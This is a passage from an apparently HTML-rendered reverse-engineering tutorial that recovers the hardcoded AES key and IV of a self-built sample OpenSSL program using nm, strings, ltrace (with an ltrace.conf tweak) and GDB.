<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
</pre></td><td class="code"><pre><code class="bash"><span class="line"><span class="nv">$ </span>nm sampleaes
</span><span class="line">         U BIO_dump_fp@@OPENSSL_1.0.0
</span><span class="line">         U ERR_free_strings@@OPENSSL_1.0.0
</span><span class="line">         U ERR_load_crypto_strings@@OPENSSL_1.0.0
</span><span class="line">         U ERR_print_errors_fp@@OPENSSL_1.0.0
</span><span class="line">         U EVP_CIPHER_CTX_free@@OPENSSL_1.0.0
</span><span class="line">         U EVP_CIPHER_CTX_new@@OPENSSL_1.0.0
</span><span class="line">         U EVP_DecryptFinal_ex@@OPENSSL_1.0.0
</span><span class="line">         U EVP_DecryptInit_ex@@OPENSSL_1.0.0
</span><span class="line">         U EVP_DecryptUpdate@@OPENSSL_1.0.0
</span><span class="line">         U EVP_EncryptFinal_ex@@OPENSSL_1.0.0
</span><span class="line">         U EVP_EncryptInit_ex@@OPENSSL_1.0.0
</span><span class="line">         U EVP_EncryptUpdate@@OPENSSL_1.0.0
</span><span class="line">         U EVP_aes_256_cbc@@OPENSSL_1.0.0
</span><span class="line">         U EVP_cleanup@@OPENSSL_1.0.0
</span><span class="line">         U OPENSSL_add_all_algorithms_noconf@@OPENSSL_1.0.0
</span><span class="line">         U OPENSSL_config@@OPENSSL_1.0.0
</span><span class="line">0804900c d _DYNAMIC
</span><span class="line">08049108 d _GLOBAL_OFFSET_TABLE_
</span><span class="line">08048d4c R _IO_stdin_used
</span><span class="line">         w _ITM_deregisterTMCloneTable
</span><span class="line">         w _ITM_registerTMCloneTable
</span><span class="line">         w _Jv_RegisterClasses
</span><span class="line">...
</span><span class="line"><span class="c"># removed the rest of the output</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<h6 id="strings">2.2.1.3 strings</h6>
<p><code>strings</code> is useful because it may leak great information about the binary. It will give us the key and IV directly in our example. We can also see OpenSSL and libcrypto strings. It also gives us the version of the used OpenSSL library.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>running strings </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
<span class="line-number">29</span>
<span class="line-number">30</span>
<span class="line-number">31</span>
<span class="line-number">32</span>
<span class="line-number">33</span>
<span class="line-number">34</span>
<span class="line-number">35</span>
<span class="line-number">36</span>
<span class="line-number">37</span>
<span class="line-number">38</span>
<span class="line-number">39</span>
<span class="line-number">40</span>
<span class="line-number">41</span>
</pre></td><td class="code"><pre><code class="cpp"><span class="line"><span class="n">strings</span> <span class="n">sampleaes</span>
</span><span class="line"><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="p">.</span><span class="n">so</span><span class="mf">.2</span>
</span><span class="line"><span class="n">libcrypto</span><span class="p">.</span><span class="n">so</span><span class="mf">.1.0.0</span>
</span><span class="line"><span class="n">_ITM_deregisterTMCloneTable</span>
</span><span class="line"><span class="n">__gmon_start__</span>
</span><span class="line"><span class="n">_Jv_RegisterClasses</span>
</span><span class="line"><span class="n">_ITM_registerTMCloneTable</span>
</span><span class="line"><span class="n">EVP_aes_256_cbc</span>
</span><span class="line"><span class="n">ERR_free_strings</span>
</span><span class="line"><span class="n">OPENSSL_config</span>
</span><span class="line"><span class="n">EVP_cleanup</span>
</span><span class="line"><span class="n">ERR_load_crypto_strings</span>
</span><span class="line"><span class="n">OPENSSL_add_all_algorithms_noconf</span>
</span><span class="line"><span class="n">EVP_CIPHER_CTX_free</span>
</span><span class="line"><span class="n">EVP_DecryptFinal_ex</span>
</span><span class="line"><span class="n">ERR_print_errors_fp</span>
</span><span class="line"><span class="n">EVP_DecryptInit_ex</span>
</span><span class="line"><span class="n">EVP_EncryptFinal_ex</span>
</span><span class="line"><span class="n">EVP_CIPHER_CTX_new</span>
</span><span class="line"><span class="n">EVP_DecryptUpdate</span>
</span><span class="line"><span class="n">EVP_EncryptInit_ex</span>
</span><span class="line"><span class="n">BIO_dump_fp</span>
</span><span class="line"><span class="n">EVP_EncryptUpdate</span>
</span><span class="line"><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="mf">.6</span>
</span><span class="line"><span class="n">_IO_stdin_used</span>
</span><span class="line"><span class="n">puts</span>
</span><span class="line"><span class="n">abort</span>
</span><span class="line"><span class="n">strlen</span>
</span><span class="line"><span class="n">stdout</span>
</span><span class="line"><span class="n">stderr</span>
</span><span class="line"><span class="n">__libc_start_main</span>
</span><span class="line"><span class="n">OPENSSL_1</span><span class="mf">.0.0</span>
</span><span class="line"><span class="n">GLIBC_2</span><span class="mf">.0</span>
</span><span class="line"><span class="n">PTRh</span>
</span><span class="line"><span class="p">[</span><span class="o">^</span><span class="n">_</span><span class="p">]</span>
</span><span class="line"><span class="n">ee12c03ceacdfb5d4c0e67c8f5ab3362</span>
</span><span class="line"><span class="n">d36a4bf2e6dd9c68</span>
</span><span class="line"><span class="n">The</span> <span class="n">quick</span> <span class="n">brown</span> <span class="n">fox</span> <span class="n">jumps</span> <span class="n">over</span> <span class="n">the</span> <span class="n">lazy</span> <span class="n">dog</span>
</span><span class="line"><span class="n">Ciphertext</span> <span class="nl">is:</span>
</span><span class="line"><span class="n">Decrypted</span> <span class="n">text</span> <span class="nl">is:</span>
</span><span class="line"><span class="p">;</span><span class="o">*</span><span class="mi">2</span><span class="err">$</span><span class="s">&quot;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<h4 id="using-ltrace-to-find-the-key">2.3  Using ltrace to Find the Key</h4>
<p>Finally let’s run ltrace on the binary. The <code>i</code> switch prints the value of instruction pointer at the time of library call (we will need it later). You can also trace syscalls using the <code>S</code> (capital S) switch.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>running ltrace </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
<span class="line-number">29</span>
<span class="line-number">30</span>
<span class="line-number">31</span>
</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nf">$</span> <span class="nv">ltrace</span> <span class="o">-</span><span class="nv">i</span> <span class="nv">.</span><span class="o">/</span><span class="nv">sampleaes</span>
</span><span class="line"><span class="err">[0</span><span class="nf">x8048921</span><span class="p">]</span> <span class="nv">__libc_start_main</span><span class="p">(</span><span class="mh">0x8048b8c</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0xbff88534</span><span class="p">,</span> <span class="mh">0x8048cd0</span><span class="p">,</span> <span class="mh">0x8048cc0</span>
</span><span class="line"><span class="err">[0</span><span class="nf">x8048bbe</span><span class="p">]</span> <span class="nv">ERR_load_crypto_strings</span><span class="p">(</span><span class="mh">0xb776dda6</span><span class="p">,</span> <span class="mh">0xb7439a30</span><span class="p">,</span> <span class="mh">0x8048629</span><span class="p">,</span> <span class="mh">0xb74266d0</span><span class="p">,</span> <span class="mh">0x80485d0</span><span class="p">)</span> <span class="err">=</span> <span class="mi">0</span>
</span><span class="line"><span class="err">[0</span><span class="nf">x8048bc3</span><span class="p">]</span> <span class="nv">OPENSSL_add_all_algorithms_noconf</span><span class="p">(</span><span class="mh">0xb776dda6</span><span class="p">,</span> <span class="mh">0xb7439a30</span><span class="p">,</span> <span class="mh">0x8048629</span><span class="p">,</span> <span class="mh">0xb74266d0</span><span class="p">,</span> <span class="mh">0x80485d0</span><span class="p">)</span> <span class="err">=</span> <span class="mi">1</span>
</span><span class="line"><span class="err">[0</span><span class="nf">x8048bcf</span><span class="p">]</span> <span class="nv">OPENSSL_config</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0xb7439a30</span><span class="p">,</span> <span class="mh">0x8048629</span><span class="p">,</span> <span class="mh">0xb74266d0</span><span class="p">,</span> <span class="mh">0x80485d0</span><span class="p">)</span>    <span class="err">=</span> <span class="mi">1</span>
</span><span class="line"><span class="err">[0</span><span class="nf">x8048bde</span><span class="p">]</span> <span class="nv">strlen</span><span class="p">(</span><span class="s">&quot;The quick brown fox jumps over t&quot;</span><span class="nv">...</span><span class="p">)</span>                      <span class="err">=</span> <span class="mi">43</span>
</span><span class="line"><span class="err">[0</span><span class="nf">x8048a0f</span><span class="p">]</span> <span class="nv">EVP_CIPHER_CTX_new</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x8048434</span><span class="p">,</span> <span class="mh">0x8049140</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0xb742e0b4</span><span class="p">)</span>         <span class="err">=</span> <span class="mh">0x90bdce0</span>
</span><span class="line"><span class="err">[0</span><span class="nf">x8048a22</span><span class="p">]</span> <span class="nv">EVP_aes_256_cbc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x8048434</span><span class="p">,</span> <span class="mh">0x8049140</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0xb742e0b4</span><span class="p">)</span>            <span class="err">=</span> <span class="mh">0xb7735040</span>
</span><span class="line"><span class="err">[0</span><span class="nf">x8048a47</span><span class="p">]</span> <span class="nv">EVP_EncryptInit_ex</span><span class="p">(</span><span class="mh">0x90bdce0</span><span class="p">,</span> <span class="mh">0xb7735040</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x8048d50</span><span class="p">,</span> <span class="mh">0x8048d71</span><span class="p">)</span> <span class="err">=</span> <span class="mi">1</span>
</span><span class="line"><span class="err">[0</span><span class="nf">x8048a78</span><span class="p">]</span> <span class="nv">EVP_EncryptUpdate</span><span class="p">(</span><span class="mh">0x90bdce0</span><span class="p">,</span> <span class="mh">0xbff883ec</span><span class="p">,</span> <span class="mh">0xbff88324</span><span class="p">,</span> <span class="mh">0x8048d84</span><span class="p">,</span> <span class="mi">43</span><span class="p">)</span> <span class="err">=</span> <span class="mi">1</span>
</span><span class="line"><span class="err">[0</span><span class="nf">x8048aa8</span><span class="p">]</span> <span class="nv">EVP_EncryptFinal_ex</span><span class="p">(</span><span class="mh">0x90bdce0</span><span class="p">,</span> <span class="mh">0xbff8840c</span><span class="p">,</span> <span class="mh">0xbff88324</span><span class="p">,</span> <span class="mh">0x8048d84</span><span class="p">,</span> <span class="mi">43</span><span class="p">)</span> <span class="err">=</span> <span class="mi">1</span>
</span><span class="line"><span class="err">[0</span><span class="nf">x8048ac3</span><span class="p">]</span> <span class="nv">EVP_CIPHER_CTX_free</span><span class="p">(</span><span class="mh">0x90bdce0</span><span class="p">,</span> <span class="mh">0xbff8840c</span><span class="p">,</span> <span class="mh">0xbff88324</span><span class="p">,</span> <span class="mh">0x8048d84</span><span class="p">,</span> <span class="mi">43</span><span class="p">)</span> <span class="err">=</span> <span class="mi">0</span>
</span><span class="line"><span class="err">[0</span><span class="nf">x8048c25</span><span class="p">]</span> <span class="nv">puts</span><span class="p">(</span><span class="s">&quot;Ciphertext is:&quot;</span><span class="nv">Ciphertext</span> <span class="nv">is</span><span class="p">:</span>
</span><span class="line"><span class="err">)</span>                                             <span class="err">=</span> <span class="err">15</span>
</span><span class="line"><span class="err">[0</span><span class="nf">x8048c48</span><span class="p">]</span> <span class="nv">BIO_dump_fp</span><span class="p">(</span><span class="mh">0xb75874e0</span><span class="p">,</span> <span class="mh">0xbff883ec</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mh">0x8048d71</span><span class="p">,</span> <span class="mh">0xbff883ec0000</span> <span class="o">-</span> <span class="mi">51</span> <span class="mi">34</span> <span class="mi">3</span><span class="nv">f</span> <span class="mi">21</span> <span class="mi">87</span> <span class="mi">5</span><span class="nv">d</span> <span class="mi">4</span><span class="nv">e</span> <span class="nv">f6</span><span class="o">-</span><span class="mi">18</span> <span class="mi">1</span><span class="nv">d</span> <span class="nv">c6</span> <span class="mi">6</span><span class="nv">d</span> <span class="mi">41</span> <span class="nv">c1</span> <span class="mi">12</span> <span class="nv">ae</span>   <span class="nv">Q4?</span><span class="err">!</span><span class="nv">.</span><span class="p">]</span><span class="nv">N....mA...</span>
</span><span class="line"><span class="err">0010</span> <span class="err">-</span> <span class="nf">e0</span> <span class="nv">a7</span> <span class="nv">de</span> <span class="nv">a0</span> <span class="nv">fa</span> <span class="nv">b9</span> <span class="mi">6</span><span class="nv">c</span> <span class="nv">b0</span><span class="o">-</span><span class="mi">91</span> <span class="mi">5</span><span class="nv">e</span> <span class="mi">21</span> <span class="nv">c6</span> <span class="nv">d3</span> <span class="mi">90</span> <span class="mi">96</span> <span class="mi">36</span>   <span class="nv">......l..</span><span class="o">^</span><span class="err">!</span><span class="nv">....6</span>
</span><span class="line"><span class="err">0020</span> <span class="err">-</span> <span class="err">70</span> <span class="err">7</span><span class="nf">b</span> <span class="nv">ec</span> <span class="mi">69</span> <span class="mi">89</span> <span class="nv">e1</span> <span class="nv">bc</span> <span class="mi">0</span><span class="nv">a</span><span class="o">-</span><span class="mi">2</span><span class="nv">c</span> <span class="mi">61</span> <span class="nv">f4</span> <span class="nv">c6</span> <span class="mi">26</span> <span class="mi">61</span> <span class="mi">5</span><span class="nv">f</span> <span class="mi">2</span><span class="nv">e</span>   <span class="nv">p</span><span class="err">{</span><span class="nv">.i....</span><span class="p">,</span><span class="nv">a..</span><span class="o">&amp;</span><span class="nv">a_.</span>
</span><span class="line"><span class="err">)</span>     <span class="err">=</span> <span class="err">3</span>
</span><span class="line"><span class="err">[0</span><span class="nf">x8048ad3</span><span class="p">]</span> <span class="nv">EVP_CIPHER_CTX_new</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0xb77789c0</span><span class="p">,</span> <span class="mh">0xbff883ec</span><span class="p">,</span> <span class="mh">0xb764bda0</span><span class="p">,</span> <span class="mh">0xb764b910</span><span class="p">)</span> <span class="err">=</span> <span class="mh">0x90bdce0</span>
</span><span class="line"><span class="err">[0</span><span class="nf">x8048ae6</span><span class="p">]</span> <span class="nv">EVP_aes_256_cbc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0xb77789c0</span><span class="p">,</span> <span class="mh">0xbff883ec</span><span class="p">,</span> <span class="mh">0xb764bda0</span><span class="p">,</span> <span class="mh">0xb764b910</span><span class="p">)</span> <span class="err">=</span> <span class="mh">0xb7735040</span>
</span><span class="line"><span class="err">[0</span><span class="nf">x8048b0b</span><span class="p">]</span> <span class="nv">EVP_DecryptInit_ex</span><span class="p">(</span><span class="mh">0x90bdce0</span><span class="p">,</span> <span class="mh">0xb7735040</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x8048d50</span><span class="p">,</span> <span class="mh">0x8048d71</span><span class="p">)</span> <span class="err">=</span> <span class="mi">1</span>
</span><span class="line"><span class="err">[0</span><span class="nf">x8048b3c</span><span class="p">]</span> <span class="nv">EVP_DecryptUpdate</span><span class="p">(</span><span class="mh">0x90bdce0</span><span class="p">,</span> <span class="mh">0xbff8836c</span><span class="p">,</span> <span class="mh">0xbff88324</span><span class="p">,</span> <span class="mh">0xbff883ec</span><span class="p">,</span> <span class="mi">48</span><span class="p">)</span> <span class="err">=</span> <span class="mi">1</span>
</span><span class="line"><span class="err">[0</span><span class="nf">x8048b6c</span><span class="p">]</span> <span class="nv">EVP_DecryptFinal_ex</span><span class="p">(</span><span class="mh">0x90bdce0</span><span class="p">,</span> <span class="mh">0xbff8838c</span><span class="p">,</span> <span class="mh">0xbff88324</span><span class="p">,</span> <span class="mh">0xbff883ec</span><span class="p">,</span> <span class="mi">48</span><span class="p">)</span> <span class="err">=</span> <span class="mi">1</span>
</span><span class="line"><span class="err">[0</span><span class="nf">x8048b87</span><span class="p">]</span> <span class="nv">EVP_CIPHER_CTX_free</span><span class="p">(</span><span class="mh">0x90bdce0</span><span class="p">,</span> <span class="mh">0xbff8838c</span><span class="p">,</span> <span class="mh">0xbff88324</span><span class="p">,</span> <span class="mh">0xbff883ec</span><span class="p">,</span> <span class="mi">48</span><span class="p">)</span> <span class="err">=</span> <span class="mi">0</span>
</span><span class="line"><span class="err">[0</span><span class="nf">x8048ca3</span><span class="p">]</span> <span class="nv">puts</span><span class="p">(</span><span class="s">&quot;Decrypted text is:&quot;</span><span class="nv">Decrypted</span> <span class="nv">text</span> <span class="nv">is</span><span class="p">:</span>
</span><span class="line"><span class="err">)</span>                                         <span class="err">=</span> <span class="err">19</span>
</span><span class="line"><span class="err">[0</span><span class="nf">x8048caf</span><span class="p">]</span> <span class="nv">puts</span><span class="p">(</span><span class="s">&quot;The quick brown fox jumps over t&quot;</span><span class="nv">...The</span> <span class="nv">quick</span> <span class="nv">brown</span> <span class="nv">fox</span> <span class="nv">jumps</span> <span class="nv">over</span> <span class="nv">the</span> <span class="nv">lazy</span> <span class="nv">dog</span>
</span><span class="line"><span class="err">)</span>                        <span class="err">=</span> <span class="err">44</span>
</span><span class="line"><span class="err">[0</span><span class="nf">x8048cb4</span><span class="p">]</span> <span class="nv">EVP_cleanup</span><span class="p">(</span><span class="mh">0xbff8836c</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mh">0x8048d50</span><span class="p">,</span> <span class="mh">0x8048d71</span><span class="p">,</span> <span class="mh">0xbff8836c</span><span class="p">)</span>      <span class="err">=</span> <span class="mi">0</span>
</span><span class="line"><span class="err">[0</span><span class="nf">x8048cb9</span><span class="p">]</span> <span class="nv">ERR_free_strings</span><span class="p">(</span><span class="mh">0xbff8836c</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mh">0x8048d50</span><span class="p">,</span> <span class="mh">0x8048d71</span><span class="p">,</span> <span class="mh">0xbff8836c</span><span class="p">)</span> <span class="err">=</span> <span class="mi">0</span>
</span><span class="line"><span class="err">[0</span><span class="nf">xffffffff</span><span class="p">]</span> <span class="o">+++</span> <span class="nv">exited</span> <span class="p">(</span><span class="nv">status</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+++</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>In a non-ideal situation, we have to either recognize the good functions from past experience or search them all. Here we are looking for a function with key and IV as parameters. According to the <a href="https://www.openssl.org/docs/crypto/EVP_EncryptInit.html">documentation</a> <code>EVP_DecryptInit_ex</code> is what we are looking for:</p>

<p><code>int EVP_DecryptInit_ex(EVP_CIPHER_CTX *ctx, const EVP_CIPHER *type, ENGINE *impl, unsigned char *key, unsigned char *iv);</code></p>

<p>But what are these values:<br />
<code>[0x8048b0b] EVP_DecryptInit_ex(0x90bdce0, 0xb7735040, 0, 0x8048d50, 0x8048d71) = 1</code>
These are pointers and are 4 bytes each (remember we are in a 32-bit OS). “<em>But where are these pointers pointing to? Do I have to use GDB?</em>” Yes, we had to use GDB before I knew that we can configure ltrace to dereference pointers. But we will use GDB too.</p>

<h5 id="configuring-ltrace">2.3.1 Configuring ltrace</h5>
<p>If we know the type of pointers, we can dereference them by modifying <a href="http://man7.org/linux/man-pages/man5/ltrace.conf.5.html">~/.ltrace.conf</a>. We can also do more elaborate stuff like defining structs as explained <a href="https://github.com/zenovich/ltrace/blob/master/etc/ltrace.conf">here</a>. In short we can add lines to ltrace.conf for certain functions. In our case we know the 4th and 5th arguments for EVP_DecryptInit_ex are strings (char*). We do not care about the first three arguments so can ignore them by defining them as <code>addr</code> (for address). Let’s add the following line to ltrace.conf:<br />
<code>int EVP_DecryptInit_ex(addr, addr, addr, string, string)</code></p>

<p>run ltrace again and annnnnnnd voila (look at lines 4 for key and IV):</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>running ltrace after configuration </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
</pre></td><td class="code"><pre><code class="cpp"><span class="line"><span class="cp"># most of the output has been removed</span>
</span><span class="line"><span class="n">EVP_CIPHER_CTX_new</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0xb77cc9c0</span><span class="p">,</span> <span class="mh">0xbfdecdec</span><span class="p">,</span> <span class="mh">0xb769fda0</span><span class="p">,</span> <span class="mh">0xb769f910</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x9ff5ce0</span>
</span><span class="line"><span class="n">EVP_aes_256_cbc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0xb77cc9c0</span><span class="p">,</span> <span class="mh">0xbfdecdec</span><span class="p">,</span> <span class="mh">0xb769fda0</span><span class="p">,</span> <span class="mh">0xb769f910</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0xb7789040</span>
</span><span class="line"><span class="n">EVP_DecryptInit_ex</span><span class="p">(</span><span class="mh">0x09ff5ce0</span><span class="p">,</span> <span class="mh">0xb7789040</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="s">&quot;ee12c03ceacdfb5d4c0e67c8f5ab3362&quot;</span><span class="p">,</span> <span class="s">&quot;d36a4bf2e6dd9c68&quot;</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class="line"><span class="n">EVP_DecryptUpdate</span><span class="p">(</span><span class="mh">0x9ff5ce0</span><span class="p">,</span> <span class="mh">0xbfdecd6c</span><span class="p">,</span> <span class="mh">0xbfdecd24</span><span class="p">,</span> <span class="mh">0xbfdecdec</span><span class="p">,</span> <span class="mi">48</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class="line"><span class="n">EVP_DecryptFinal_ex</span><span class="p">(</span><span class="mh">0x9ff5ce0</span><span class="p">,</span> <span class="mh">0xbfdecd8c</span><span class="p">,</span> <span class="mh">0xbfdecd24</span><span class="p">,</span> <span class="mh">0xbfdecdec</span><span class="p">,</span> <span class="mi">48</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class="line"><span class="n">EVP_CIPHER_CTX_free</span><span class="p">(</span><span class="mh">0x9ff5ce0</span><span class="p">,</span> <span class="mh">0xbfdecd8c</span><span class="p">,</span> <span class="mh">0xbfdecd24</span><span class="p">,</span> <span class="mh">0xbfdecdec</span><span class="p">,</span> <span class="mi">48</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p><span class="caption-wrapper"><img class="caption" src="http://parsiya.net/images/2015/tales1/Queen-Amused.jpg" width="" height="" title="Her Majesty is amused – If you are offended please don’t send James Bond after me" /><span class="caption-text">Her Majesty is amused – If you are offended please don’t send James Bond after me</span></span></p>

<h4 id="finding-the-key-using-gdb-ii-electric-boogaloo">2.4  Finding the Key (Using GDB) II: Electric Boogaloo</h4>
<p>That was too easy but we pleased a powerful friend. Let’s try and find it using GDB (gasp). Good thing that we compiled out binary using the ggdb switch. If not go ahead and do that. We know we are looking for <code>EVP_DecryptInit_ex</code> and we have already seen how to use GDB. We will <code>set verbose on</code> (in case stuff happens).</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>running in GDB with debug info 1 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
<span class="line-number">29</span>
<span class="line-number">30</span>
<span class="line-number">31</span>
<span class="line-number">32</span>
<span class="line-number">33</span>
<span class="line-number">34</span>
<span class="line-number">35</span>
<span class="line-number">36</span>
<span class="line-number">37</span>
<span class="line-number">38</span>
<span class="line-number">39</span>
<span class="line-number">40</span>
<span class="line-number">41</span>
<span class="line-number">42</span>
<span class="line-number">43</span>
<span class="line-number">44</span>
<span class="line-number">45</span>
<span class="line-number">46</span>
<span class="line-number">47</span>
</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nf">$</span> <span class="nv">gdb</span> <span class="nv">.</span><span class="o">/</span><span class="nv">sampleaes</span> <span class="o">-</span><span class="nv">q</span>
</span><span class="line"><span class="nf">Reading</span> <span class="nv">symbols</span> <span class="nv">from</span> <span class="o">/</span><span class="nv">root</span><span class="o">/</span><span class="nv">Desktop</span><span class="o">/</span><span class="nv">kek</span><span class="o">/</span><span class="nv">sampleaes...done.</span>
</span><span class="line"><span class="err">(</span><span class="nf">gdb</span><span class="p">)</span> <span class="nv">set</span> <span class="nv">verbose</span> <span class="nv">on</span>
</span><span class="line"><span class="err">(</span><span class="nf">gdb</span><span class="p">)</span> <span class="nv">break</span> <span class="nv">EVP_DecryptInit_ex</span>  <span class="c1">; setting up the breakpoint</span>
</span><span class="line"><span class="nf">Breakpoint</span> <span class="mi">1</span> <span class="nv">at</span> <span class="mh">0x8048830</span>
</span><span class="line"><span class="err">(</span><span class="nf">gdb</span><span class="p">)</span> <span class="nv">run</span>                       <span class="c1">; running the program</span>
</span><span class="line"><span class="nf">Starting</span> <span class="nv">program</span><span class="p">:</span> <span class="o">/</span><span class="nv">root</span><span class="o">/</span><span class="nv">Desktop</span><span class="o">/</span><span class="nv">kek</span><span class="o">/</span><span class="nv">sampleaes</span>
</span><span class="line"><span class="nf">Reading</span> <span class="nv">symbols</span> <span class="nv">from</span> <span class="o">/</span><span class="nv">lib</span><span class="o">/</span><span class="nv">ld</span><span class="o">-</span><span class="nv">linux.so.2...</span><span class="p">(</span><span class="nv">no</span> <span class="nv">debugging</span> <span class="nv">symbols</span> <span class="nv">found</span><span class="p">)</span><span class="nv">...done.</span>
</span><span class="line"><span class="nf">Loaded</span> <span class="nv">symbols</span> <span class="nv">for</span> <span class="o">/</span><span class="nv">lib</span><span class="o">/</span><span class="nv">ld</span><span class="o">-</span><span class="nv">linux.so.2</span>
</span><span class="line"><span class="nf">Reading</span> <span class="nv">symbols</span> <span class="nv">from</span> <span class="nv">system</span><span class="o">-</span><span class="nv">supplied</span> <span class="nb">DS</span><span class="nv">O</span> <span class="nv">at</span> <span class="mh">0xb7fe1000</span><span class="nv">...</span><span class="p">(</span><span class="nv">no</span> <span class="nv">debugging</span> <span class="nv">symbols</span> <span class="nv">found</span><span class="p">)</span><span class="nv">...done.</span>
</span><span class="line"><span class="nf">Reading</span> <span class="nv">symbols</span> <span class="nv">from</span> <span class="o">/</span><span class="nv">usr</span><span class="o">/</span><span class="nv">lib</span><span class="o">/</span><span class="nv">i386</span><span class="o">-</span><span class="nv">linux</span><span class="o">-</span><span class="nv">gnu</span><span class="o">/</span><span class="nv">i686</span><span class="o">/</span><span class="nv">cmov</span><span class="o">/</span><span class="nv">libcrypto.so.1.0.0...</span><span class="p">(</span><span class="nv">no</span> <span class="nv">debugging</span> <span class="nv">symbols</span> <span class="nv">found</span><span class="p">)</span><span class="nv">...done.</span>
</span><span class="line"><span class="nf">Loaded</span> <span class="nv">symbols</span> <span class="nv">for</span> <span class="o">/</span><span class="nv">usr</span><span class="o">/</span><span class="nv">lib</span><span class="o">/</span><span class="nv">i386</span><span class="o">-</span><span class="nv">linux</span><span class="o">-</span><span class="nv">gnu</span><span class="o">/</span><span class="nv">i686</span><span class="o">/</span><span class="nv">cmov</span><span class="o">/</span><span class="nv">libcrypto.so.1.0.0</span>
